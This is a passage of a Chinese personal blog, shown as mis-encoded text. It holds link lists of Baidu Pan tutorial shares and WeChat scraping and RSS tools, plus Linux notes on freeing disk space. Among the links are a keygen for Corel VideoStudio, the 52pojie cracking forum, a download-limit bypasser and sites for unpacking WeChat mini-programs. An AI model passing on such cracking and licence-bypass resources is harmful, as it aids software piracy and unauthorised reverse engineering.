<p>2ã€ç™¾å®¶å·è¿è¥æ•™ç¨‹<br>é“¾æ¥ï¼š<a href="https://pan.baidu.com/s/1paxngap2tvGXRByM0h7ivw" target="_blank" rel="noopener">https://pan.baidu.com/s/1paxngap2tvGXRByM0h7ivw</a><br>æå–ç ï¼š6j3i </p>
<p>3ã€å…¬ä¼—å·æš´åˆ©æ¶¨ç²‰æ•™ç¨‹ </p>
<p>é“¾æ¥ï¼š<a href="https://pan.baidu.com/s/1c_FWchNKlu-d5NkrZRPi0A" target="_blank" rel="noopener">https://pan.baidu.com/s/1c_FWchNKlu-d5NkrZRPi0A</a><br>æå–ç ï¼šhgcc </p>
<p>4ã€å¾®åšè¿è¥é»‘ç§‘æŠ€æ•™ç¨‹ </p>
<p>é“¾æ¥ï¼š<a href="https://pan.baidu.com/s/1LVpsrqKoSlwMcnBNrF543g" target="_blank" rel="noopener">https://pan.baidu.com/s/1LVpsrqKoSlwMcnBNrF543g</a><br>æå–ç ï¼šwrbz </p>
<p>5ã€çŸ­è§†é¢‘è‡ªåª’ä½“è¿è¥å…¥é—¨æ•™ç¨‹<br>é“¾æ¥ï¼š<a href="https://pan.baidu.com/s/1d5t_xIiYJM-sy1H2cUeodg" target="_blank" rel="noopener">https://pan.baidu.com/s/1d5t_xIiYJM-sy1H2cUeodg</a><br>æå–ç ï¼š4hb0 </p>
<p>1ã€è‡ªåª’ä½“å…¥é—¨å…¨å¥—æ•™ç¨‹<br>é“¾æ¥ï¼š<a href="https://pan.baidu.com/s/19i_52IPkaXAAwCptEKAiOg" target="_blank" rel="noopener">https://pan.baidu.com/s/19i_52IPkaXAAwCptEKAiOg</a><br>æå–ç ï¼šuv1f</p>
<p>Flutterä»å…¥é—¨åˆ°è¿›é˜¶å®æˆ˜æºç¨‹ç½‘Appæ— å¯† é“¾æ¥: <a href="https://pan.baidu.com/s/1XbPVYo0qk2U3ExbxNvTEnw" target="_blank" rel="noopener">https://pan.baidu.com/s/1XbPVYo0qk2U3ExbxNvTEnw</a> æå–ç : r672</p>
<p> <a href="http://pandownload.com/index.html" target="_blank" rel="noopener">http://pandownload.com/index.html</a><br><a href="http://www.wenkuwenku.com/" target="_blank" rel="noopener">http://www.wenkuwenku.com/</a></p>
<p>ç™¾åº¦æœç´¢ å‘¨æ°ä¼¦ä¸“è¾‘ ç™¾åº¦äº‘</p>
<p><a href="https://mp.weixin.qq.com/s/Sobuvc8J56dryQ5jeLfyMw" target="_blank" rel="noopener">æ•™ä½ ä¸‹è½½è¢«è¿…é›·&amp;ç™¾åº¦äº‘å±è”½çš„èµ„æº</a></p>
<p> å·¥å…·å¤§åˆé›†ç‚¹è¿™é‡Œï¼š<a href="https://pan.baidu.com/s/1hhd7C0kQx1ASsDGmf3LCPQ" target="_blank" rel="noopener">https://pan.baidu.com/s/1hhd7C0kQx1ASsDGmf3LCPQ</a> æå–ç ï¼šcs6r<br>å†°ç‚¹æ–‡åº“ä¸‹è½½å™¨<a href="https://pan.baidu.com/s/1YApVf32Ww7mCFSm5ECYBog" target="_blank" rel="noopener">https://pan.baidu.com/s/1YApVf32Ww7mCFSm5ECYBog</a><br>ä¼šå£°ä¼šå½±è§†é¢‘ç¼–è¾‘è½¯ä»¶æ³¨å†Œæœºæ±‰åŒ–ç‰ˆ<br><a href="https://pan.baidu.com/s/1XYiSLVmhaHvmr-Q_JHcBkQ" target="_blank" rel="noopener">https://pan.baidu.com/s/1XYiSLVmhaHvmr-Q_JHcBkQ</a><br>æå–ç ï¼šbcr4 </p>
<p>æ¨èä¸€ä¸‹å‡ æœ¬ä¹¦ã€Šå›¾è§£ TCP/IPã€‹ã€Šå›¾è§£ HTTPã€‹ã€Šå›¾è§£ç®—æ³•ã€‹ã€ŠLaravel æ¡†æ¶å…³é”®æŠ€æœ¯è§£æã€‹ã€Šç°ä»£æ“ä½œç³»ç»Ÿ 4ã€‹</p>
<p>åˆ†äº«ä¸€ä¸ªPHPè¯¾ç¨‹ åŠ©ä½ åŠ è–ª   é“¾æ¥: <a href="https://pan.baidu.com/s/1lH4r6Tb-E-8w8nXLCbimTA" target="_blank" rel="noopener">https://pan.baidu.com/s/1lH4r6Tb-E-8w8nXLCbimTA</a> æå–ç : jhsx<br><a href="https://pan.baidu.com/mbox/homepage?short=n3xq7w9" target="_blank" rel="noopener">è¯¾ç¨‹æ”¶é›†</a></p>
<p><a href="https://learnku.com/articles/32189" target="_blank" rel="noopener">ç¨‹åºå‘˜ç»å…¸ä¹¦ç±æ¨è</a></p>
<p><a href="https://github.com/high-speed-downloader/high-speed-downloader" target="_blank" rel="noopener">ç™¾åº¦ç½‘ç›˜ä¸é™é€Ÿä¸‹è½½å™¨</a></p>
<p><a href="http://www.meinigui.com/movie/index.html" target="_blank" rel="noopener">ç”µå½±ç½‘ç«™</a></p>
<p><a href="https://pan.baidu.com/share/init?surl=ASNYXmci4RRbyhxtYeYDGA" target="_blank" rel="noopener">å…¬ä¼—å·è§†é¢‘ æå–ç ï¼špvek</a> </p>
<p><a href="https://github.com/ganlvtech/down_52pojie_cn" target="_blank" rel="noopener">å¾çˆ±ç ´è§£è®ºå› çˆ±ç›˜ down.52pojie.cn</a></p>
<p><a href="http://yyeer.com/%E8%AF%BB%E4%B9%A6/2017/12/18/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E5%AD%A6%E5%BE%AE%E4%BF%A1%E8%BF%90%E8%90%A5-%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/" target="_blank" rel="noopener">ã€Šä»é›¶å¼€å§‹å­¦å¾®ä¿¡è¿è¥ã€‹è¯»ä¹¦ç¬”è®°</a></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/05/08/å¾®ä¿¡ç›¸å…³/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="è‹ç”Ÿä¸æƒ‘">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="è‹ç”Ÿä¸æƒ‘çš„åšå®¢">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/05/08/å¾®ä¿¡ç›¸å…³/" itemprop="url">å¾®ä¿¡ç›¸å…³</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">å‘è¡¨äº</span>
              
              <time title="åˆ›å»ºäº" itemprop="dateCreated datePublished" datetime="2019-05-08T20:26:15+08:00">
                2019-05-08
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                  <span class="post-meta-divider">|</span>
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">å­—æ•°ç»Ÿè®¡&#58;</span>
                
                <span title="å­—æ•°ç»Ÿè®¡">
                  631 å­—
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">é˜…è¯»æ—¶é•¿ &asymp;</span>
                
                <span title="é˜…è¯»æ—¶é•¿">
                  2 åˆ†é’Ÿ
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>å¾®ä¿¡å…¬ä¼—å·å¯ä»¥ç”¨ huggin æŠ“å–æœç‹—æœç´¢çš„ç»“æœ<br><a href="https://weread.app/rank" target="_blank" rel="noopener">å…¬ä¼—å· RSS è®¢é˜… TOP 200</a></p>
<p><a href="https://github.com/PengJenas/MineWechat" target="_blank" rel="noopener">å¾®ä¿¡ç¾¤å‘ã€è‡ªåŠ¨å›å¤ã€æ‰‹æœºå¾®ä¿¡ç®€å•è¿œæ§ç”µè„‘</a></p>
<p><a href="https://www.paycats.cn/" target="_blank" rel="noopener">ç¬¬ä¸‰æ–¹æ”¯ä»˜ payjs</a></p>
<p><a href="https://docs.rsshub.app/" target="_blank" rel="noopener">æ˜“äºæ‰©å±•çš„ RSS ç”Ÿæˆå™¨</a></p>
<p><a href="https://www.v2ex.com/t/492551" target="_blank" rel="noopener">RSS è®¢é˜…å¾®ä¿¡å…¬ä¼—å·çš„å„ç§è§£å†³æ–¹æ¡ˆ</a></p>
<p><a href="http://www.ershicimi.com/" target="_blank" rel="noopener">å…¬ä¼—å·æ”¶é›†</a></p>
<p><a href="http://www.qianhaikeji.cn/" target="_blank" rel="noopener">ä¸€é”®å¯¼å‡ºå¾®ä¿¡å…¬ä¼—å·</a></p>
<p><a href="https://www.zhihu.com/question/21288524" target="_blank" rel="noopener">rssè®¢é˜…å¾®ä¿¡å…¬ä¼—å¹³å°ä¸Šçš„æ–‡ç« </a></p>
<p><a href="https://github.com/leo8916/wxhub" target="_blank" rel="noopener">å¾®ä¿¡å…¬ä¼—å·-æ–‡ç« -æ— é™åˆ¶æŠ“å–</a></p>
<p><a href="https://mp.weixin.qq.com/s/LUavw-4dc1UgB1xiM8UT5Q" target="_blank" rel="noopener">å…¬ä¼—å·å¼€é€šäº†æµé‡ä¸»ï¼Œä¸¤å‘¨èµšäº† 47.63 å…ƒå¹¿å‘Šè´¹</a></p>
<p><a href="https://www.v2ex.com/t/507696" target="_blank" rel="noopener"> åœ¨ PPT åŠ¨ç”»ä¸­å­¦ç®—æ³•ï¼ˆæ¯å¤© 5 åˆ†é’Ÿä¸€é“ç®—æ³•ï¼‰</a></p>
<p><a href="https://www.zhihu.com/question/26716409/answer/224332129" target="_blank" rel="noopener">æ€æ ·é‡‡é›†å…¬ä¼—å·çš„é˜…è¯»æ•°å’Œç‚¹èµæ•°</a></p>
<p><a href="https://kywx.xyz/" target="_blank" rel="noopener">ç»™æ²¡æœ‰æƒé™çš„å…¬ä¼—å·å¢åŠ ç•™è¨€åŠŸèƒ½</a></p>
<p><a href="https://code2048.com/" target="_blank" rel="noopener">ã€Šç¥ç§˜çš„ç¨‹åºå‘˜ä»¬ã€‹</a></p>
<p><a href="https://github.com/GitHubDaily/GitHubDaily" target="_blank" rel="noopener">2018 å¹´æ‰€å‘çš„å¾®åšè¿›è¡Œåˆ†ç±»æ•´ç†</a></p>
<p><a href="https://rss.mifaw.com/" target="_blank" rel="noopener">RSS å…¨æ–‡æº</a></p>
<p><a href="https://qnmlgb.tech/" target="_blank" rel="noopener">ç“¦æ–¯é˜…è¯»</a></p>
<p><a href="https://www.vreadtech.com/" target="_blank" rel="noopener">web ä¸Šçœ‹å¾®ä¿¡å…¬ä¼—å·</a></p>
<p><a href="https://www.v2ex.com/t/490020" target="_blank" rel="noopener">ä¸€æ¡ä¸¤åˆ†é’Ÿè¯»å®Œçš„å¼€å‘å°æŠ€å·§</a></p>
<p><a href="https://github.com/songluyi/crawl_wechat" target="_blank" rel="noopener">æ‰¹é‡çˆ¬å–å¾®ä¿¡å…¬ä¼—å·æ‰€æœ‰æ–‡ç« </a></p>
<p><a href="https://weixinshu.com/" target="_blank" rel="noopener">å¯¼å‡ºæœ‹å‹åœˆæˆä¹¦</a></p>
<p><a href="http://tbq.gootile.com/download" target="_blank" rel="noopener">åŒæ­¥æœ‹å‹åœˆå¾®åš</a></p>
<p><a href="https://www.v2ex.com/t/306226" target="_blank" rel="noopener">çˆ¬å–å¾®ä¿¡å…¬ä¼—å·</a></p>
<p><a href="https://github.com/Terminus2049/ArchiveTeleBot" target="_blank" rel="noopener">ArchiveTeleBot</a></p>
<p><a href="https://blog.smoker.cc/crawler/convert-sogou-weixin-article-temporary-link-into-permanent-link.html" target="_blank" rel="noopener">æœç‹—å¾®ä¿¡å…¬ä¼—å·æ–‡ç« ä¸´æ—¶é“¾æ¥è½¬ä¸ºæ°¸ä¹…é“¾æ¥https://www.v2ex.com/t/520588</a></p>
<p><a href="http://pooltea.com/forum/fans_3.php" target="_blank" rel="noopener">å…¬ä¼—å·äº’ç²‰</a></p>
<p><a href="https://learnku.com/laravel/t/29141" target="_blank" rel="noopener"> Laravel æ¥å…¥å¾®ä¿¡å°ç¨‹åºç™»é™†åŠŸèƒ½</a></p>
<p><a href="https://weread.qnmlgb.tech/?rel=ws" target="_blank" rel="noopener">å¾®ä¿¡è¯»ä¹¦</a></p>
<p><a href="http://www.zhidaow.com/post/weo-first-post" target="_blank" rel="noopener">å¾®ä¿¡æœä¸€æœæ’åç»“æœåˆ†æ</a></p>
<p><a href="https://www.xiaokuake.com/p/mimeng.html?from=groupmessage" target="_blank" rel="noopener">ç”¨æ•°æ®è§£è¯»å’ªè’™</a></p>
<p><a href="https://github.com/largezhou/wechat-menu" target="_blank" rel="noopener">å¾®ä¿¡å…¬ä¼—å·èœå•ç®¡ç†æ‰©å±•</a></p>
<p><a href="https://tophub.today/n/WnBe01o371?utm_source=hacpai.com" target="_blank" rel="noopener">å¾®ä¿¡çƒ­æ–‡</a></p>
<p><a href="http://ciika.com/2018/07/winddow-charles-https/" target="_blank" rel="noopener">å…¬ä¼—å·æ–‡ç« HTTPSæŠ“åŒ…</a></p>
<p><a href="https://learnku.com/articles/26718" target="_blank" rel="noopener">å¾®ä¿¡æ‰«ç  - å…³æ³¨å…¬ä¼—å·åç½‘ç«™è‡ªåŠ¨ç™»å½•</a></p>
<p><a href="https://we.wwei.cn/" target="_blank" rel="noopener">å¾®ä¿¡å¯¹è¯ç”Ÿæˆå™¨</a></p>
<p><a href="https://smallvideo.dozentools.com/" target="_blank" rel="noopener">æŠ–éŸ³è§†é¢‘ä¸‹è½½ github.com/ChinaBygones/PHP-DouyinRobot</a></p>
<p><a href="https://github.com/mingyoung/wechat-playground" target="_blank" rel="noopener">å¾®ä¿¡è°ƒè¯•å·¥å…· WeChat Playground </a></p>
<p><a href="https://learnku.com/articles/32351" target="_blank" rel="noopener">å¾®ä¿¡æ‰«å°ç¨‹åºç å®ç°ç½‘é¡µç«¯ç™»å½•</a></p>
<p>å¾®ä¿¡è¯»ä¹¦ç»„é˜ŸæŠ½å¥– <a href="https://weread.qnmlgb.tech/" target="_blank" rel="noopener">https://weread.qnmlgb.tech/</a> æ—¢å¯ä»¥å¿«é€Ÿç»„é˜ŸæŠ½å¥–åˆä¸ç”¨åˆ†äº«ç¾¤æˆ–è€…æœ‹å‹åœˆã€‚</p>
<p>ç ´è§£ å¾®ä¿¡å°ç¨‹åº wxapkg çš„ç½‘ç«™  <a href="https://taobao.zhaoyizhe.com/" target="_blank" rel="noopener">https://taobao.zhaoyizhe.com/</a> <a href="http://mm.cqu.cc/tools/wxapkg/" target="_blank" rel="noopener">http://mm.cqu.cc/tools/wxapkg/</a> <a href="https://github.com/qwerty472123/wxappUnpacker.git" target="_blank" rel="noopener">https://github.com/qwerty472123/wxappUnpacker.git</a></p>
<p><a href="http://lambda-xmu.club/2019/09/16/%E5%BE%AE%E5%8D%9A-%E5%A4%B4%E6%9D%A1-%E6%8A%96%E9%9F%B3%E7%83%AD%E6%90%9C%E6%AF%94%E8%BE%83/" target="_blank" rel="noopener">2019-09-16-å¾®åšã€å¤´æ¡ã€æŠ–éŸ³çƒ­æœæ¯”è¾ƒ</a></p>
<p><a href="https://github.com/nasaplayer/WeChatRobotYa" target="_blank" rel="noopener">å¾®ä¿¡è‡ªåŠ¨å›å¤æœºå™¨äººå°é›…</a></p>
<h3 id="å¾®ä¿¡å½•éŸ³æ–‡ä»¶çš„å¤„ç†mp3"><a href="#å¾®ä¿¡å½•éŸ³æ–‡ä»¶çš„å¤„ç†mp3" class="headerlink" title="å¾®ä¿¡å½•éŸ³æ–‡ä»¶çš„å¤„ç†mp3"></a>å¾®ä¿¡å½•éŸ³æ–‡ä»¶çš„å¤„ç†mp3</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">wget https:<span class="comment">//downloads.xiph.org/releases/speex/speex-1.2.0.tar.gz</span></span><br><span class="line">tar xzvf speex<span class="number">-1.2</span><span class="number">.0</span>.tar.gz</span><br><span class="line">cd speex<span class="number">-1.2</span><span class="number">.0</span> &amp;&amp; ./configure &amp;&amp; make &amp;&amp; make install</span><br><span class="line">git clone https:<span class="comment">//github.com/gamelife1314/wechat-speex-declib.git</span></span><br><span class="line">cd wechat-speex-declib &amp;&amp; make &amp;&amp; cp ./bin/speex_decode /usr/local/bin/speex2wav</span><br><span class="line"></span><br><span class="line">yum install speex-devel</span><br><span class="line">speex2wav xxx.amr   xxxx.mp3</span><br><span class="line">speex2wav xxx.speex xxxx.wav</span><br><span class="line">http:<span class="comment">//www.putyy.com/article/19</span></span><br></pre></td></tr></table></figure>
<p><a href="https://henix.github.io/feeds/weixin.sogou.banfoSB/" target="_blank" rel="noopener">åŠä½›ä»™äººé‚£äº›ç–¯ç™«åˆæš´èºçš„å…¬ä¼—å·çµé­‚æ–‡ç« </a></p>
<p><a href="https://felixxiong.github.io/2019/10/04/%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E8%B4%A6%E5%8F%B7%E7%94%B3%E8%AF%B7%E6%9D%90%E6%96%99%E5%B9%B6%E5%BC%80%E9%80%9A%E4%B8%8E%E8%AE%A4%E8%AF%81%E5%85%A8%E8%BF%87%E7%A8%8B%E8%AE%B0%E5%BD%95/" target="_blank" rel="noopener">å¾®ä¿¡å…¬ä¼—è´¦å·ç”³è¯·ææ–™å¹¶å¼€é€šä¸è®¤è¯å…¨è¿‡ç¨‹è®°å½• </a></p>
<p><a href="https://www.jianshu.com/p/283e5dd57d35" target="_blank" rel="noopener">2019.9æœˆæœ€æ–°çˆ¬å–å¾®ä¿¡å…¬ä¼—å·å†å²æ–‡ç« çš„åŠæ³•</a></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/04/26/linux-ç¬”è®°/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="è‹ç”Ÿä¸æƒ‘">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="è‹ç”Ÿä¸æƒ‘çš„åšå®¢">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/04/26/linux-ç¬”è®°/" itemprop="url">linux ç¬”è®°</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">å‘è¡¨äº</span>
              
              <time title="åˆ›å»ºäº" itemprop="dateCreated datePublished" datetime="2019-04-26T16:54:15+08:00">
                2019-04-26
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                  <span class="post-meta-divider">|</span>
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">å­—æ•°ç»Ÿè®¡&#58;</span>
                
                <span title="å­—æ•°ç»Ÿè®¡">
                  14.6k å­—
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">é˜…è¯»æ—¶é•¿ &asymp;</span>
                
                <span title="é˜…è¯»æ—¶é•¿">
                  67 åˆ†é’Ÿ
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h3 id="ç£ç›˜ç©ºé—´ä¸è¶³"><a href="#ç£ç›˜ç©ºé—´ä¸è¶³" class="headerlink" title="ç£ç›˜ç©ºé—´ä¸è¶³"></a>ç£ç›˜ç©ºé—´ä¸è¶³</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">dfå‘½ä»¤æŸ¥çœ‹å½“å‰è®¡ç®—å™¨ç£ç›˜ç©ºé—²æƒ…å†µ</span><br><span class="line"> df -a</span><br><span class="line"> ä»æ ¹ç›®å½•ä¸‹å¼€å§‹ä½¿ç”¨duå‘½ä»¤æŸ¥æ‰¾å‡ºç©ºé—´å ç”¨æœ€å¤§çš„æ–‡ä»¶</span><br><span class="line">  du -sh <span class="comment">/*å‘½ä»¤ä¸€è·¯è¿½æŸ¥</span></span><br><span class="line"><span class="comment"> [root@test-os testuser]# df -h   ###ç‰©ç†ç£ç›˜ç©ºé—´ æŸ¥çœ‹æ‰€æœ‰blockä½¿ç”¨æƒ…å†µ</span></span><br><span class="line"><span class="comment"> Filesystem      Size  Used Avail Use% Mounted on</span></span><br><span class="line"><span class="comment"> /dev/sda3       8.8G  8.8G     0 100% /</span></span><br><span class="line"><span class="comment"> tmpfs           931M     0  931M   0% /dev/shm</span></span><br><span class="line"><span class="comment"> /dev/sda1       190M   40M  141M  22% /boot</span></span><br><span class="line"><span class="comment"> [root@test-os testuser]# du -sh /usr/* |grep G  ###æŸ¥æ‰¾å¤§æ–‡ä»¶</span></span><br><span class="line"><span class="comment"> 7.3G    /usr/local</span></span><br><span class="line"><span class="comment"> [root@test-os testuser]# du -sh /usr/local/* |grep G</span></span><br><span class="line"><span class="comment"> 7.3G    /usr/local/bin</span></span><br><span class="line"><span class="comment"> [root@test-os testuser]# du -sh /usr/local/bin/* |grep G</span></span><br><span class="line"><span class="comment"> 7.3G    /usr/local/bin/1g</span></span><br><span class="line"><span class="comment"> </span></span><br><span class="line"><span class="comment"> [root@test-os testuser]# rm -f /usr/local/bin/1g  ###åˆ é™¤å¤§æ–‡ä»¶</span></span><br><span class="line"><span class="comment">æœ‰äº›æ–‡ä»¶åˆ é™¤æ—¶è¿˜è¢«å…¶å®ƒè¿›ç¨‹å ç”¨ï¼Œæ­¤æ—¶æ–‡ä»¶å¹¶æœªçœŸæ­£åˆ é™¤ï¼Œåªæ˜¯æ ‡è®°ä¸º deletedï¼Œåªæœ‰è¿›ç¨‹ç»“æŸåæ‰ä¼šå°†æ–‡ä»¶çœŸæ­£ä»ç£ç›˜ä¸­æ¸…é™¤ã€‚</span></span><br><span class="line"><span class="comment"> [root@test-os ~]# lsof |grep deleted </span></span><br><span class="line"><span class="comment"> rsyslogd   1250      root    1w      REG                8,3 4888889358     140789 /var/log/messages (deleted)</span></span><br><span class="line"><span class="comment"> </span></span><br><span class="line"><span class="comment"> [root@test-os ~]# #lsof æ˜¾ç¤ºå‡ºç³»ç»Ÿä¸­è¢«æ‰“å¼€çš„æ–‡ä»¶ </span></span><br><span class="line"><span class="comment"> [root@test-os ~]# #ç¬¬ä¸€åˆ— è½¯ä»¶/æœåŠ¡çš„åç§°</span></span><br><span class="line"><span class="comment"> [root@test-os ~]# #ç¬¬å…«åˆ— æ–‡ä»¶çš„å¤§å° </span></span><br><span class="line"><span class="comment"> [root@test-os ~]# #ç¬¬10åˆ— æ–‡ä»¶çš„åå­—</span></span><br><span class="line"><span class="comment"> [root@test-os ~]# #ç¬¬11åˆ— æ ‡è®°ï¼ˆç¡¬é“¾æ¥æ•°ä¸º0 è¿›ç¨‹è°ƒç”¨æ•°ä¸ä¸ºé›¶ å°±ä¼šæœ‰ delete)</span></span><br><span class="line"><span class="comment"> </span></span><br><span class="line"><span class="comment"> ####é‡å¯å¯¹åº”çš„æœåŠ¡ é‡Šæ”¾ç£ç›˜ç©ºé—´ </span></span><br><span class="line"><span class="comment"> [root@test-os ~]# /etc/init.d/rsyslog restart </span></span><br><span class="line"><span class="comment"> --------------------- </span></span><br><span class="line"><span class="comment"> [root@test-os ~]# df -h</span></span><br><span class="line"><span class="comment"> Filesystem      Size  Used Avail Use% Mounted on</span></span><br><span class="line"><span class="comment"> /dev/sda3       8.8G  1.5G  6.9G  18% /</span></span><br><span class="line"><span class="comment"> tmpfs           931M     0  931M   0% /dev/shm</span></span><br><span class="line"><span class="comment"> /dev/sda1       190M   40M  141M  22% /boot</span></span><br><span class="line"><span class="comment"> /tmp/1m        1003K   19K  933K   2% /app/logs</span></span><br><span class="line"><span class="comment"> --------------------- </span></span><br><span class="line"><span class="comment"> # df -ih èŠ‚ç‚¹ç£ç›˜ç©ºé—´</span></span><br><span class="line"><span class="comment"> Filesystem Inodes IUsed IFree IUse% Mounted on</span></span><br><span class="line"><span class="comment"> /dev/vda1 1.9M 299K 1.6M 17% /</span></span><br><span class="line"><span class="comment"> udev  123K 299 123K 1% /dev</span></span><br><span class="line"><span class="comment"> tmpfs  126K 249 125K 1% /run</span></span><br><span class="line"><span class="comment"> tmpfs  126K 4 126K 1% /run/lock</span></span><br><span class="line"><span class="comment"> tmpfs  126K 2 126K 1% /run/shm</span></span><br><span class="line"><span class="comment"> å¯ä»¥çœ‹åˆ°ï¼Œinode åŒºåŸŸåªè¢«å ç”¨äº†ä¸€å°éƒ¨åˆ†ï¼Œè¿˜æœ‰å¤§é‡çš„ç©ºé—´æœªä½¿ç”¨ï¼Œæ‰€ä»¥ä¹Ÿä¸æ˜¯ inode åŒºåŸŸè¢«å æ»¡çš„é—®é¢˜ã€‚</span></span><br><span class="line"><span class="comment"> æŸ¥çœ‹å“ªä¸ªç›®å½•å ç”¨è¿‡å¤§ï¼š</span></span><br><span class="line"><span class="comment"> </span></span><br><span class="line"><span class="comment"> cd /;du  -sh ./* |sort -nr|more</span></span><br><span class="line"><span class="comment"> å‘ç° /var/spool/postfix/maildrop è¿™ä¸ªç›®å½•å ç”¨äº†12G å¤šçš„ç©ºé—´</span></span><br><span class="line"><span class="comment"> åˆ é™¤è¿™ä¸ªç›®å½•ä¸‹çš„å†…å®¹(é€šè¿‡ç®¡é“çš„æ–¹å¼åˆ é™¤,é¿å…å‚æ•°è¿‡é•¿å¯¼è‡´æ— æ³•æ‰§è¡Œ)ï¼š</span></span><br><span class="line"><span class="comment"> </span></span><br><span class="line"><span class="comment"> ls | xargs rm -f</span></span><br><span class="line"><span class="comment"> lsof test.log</span></span><br><span class="line"><span class="comment"> è¿™å‘½ä»¤åªèƒ½åœ¨æ–‡ä»¶è¢«å†™å…¥çš„æ—¶å€™æ‰èƒ½æ˜¾ç¤ºå†…å®¹ï¼Œæœ€åè™½ç„¶å¾—åˆ°äº†ä¸ªè¿›ç¨‹å·ï¼Œä½†æ˜¯å› ä¸ºå†™å®Œè¿›ç¨‹å°±å…³é—­äº†ï¼Œæ‰€ä»¥è¿˜æ˜¯æŸ¥ä¸åˆ°</span></span><br><span class="line"><span class="comment"> </span></span><br><span class="line"><span class="comment">    for i in /home/*; do echo $i; find $i |wc -l; done</span></span><br><span class="line"><span class="comment"> </span></span><br><span class="line"><span class="comment">    é€šè¿‡è¯¥å‘½ä»¤å¯ä»¥æŸ¥çœ‹æ¯ä¸ªç”¨æˆ·homeä¸‹inodeçš„å ç”¨æƒ…å†µã€‚å¦‚æœæŸä¸ªç›®å½•ä¸‹çš„inodeå¾ˆå¤§ï¼Œé‚£å°±æ˜¯é—®é¢˜æ‰€åœ¨äº†ã€‚</span></span><br></pre></td></tr></table></figure>
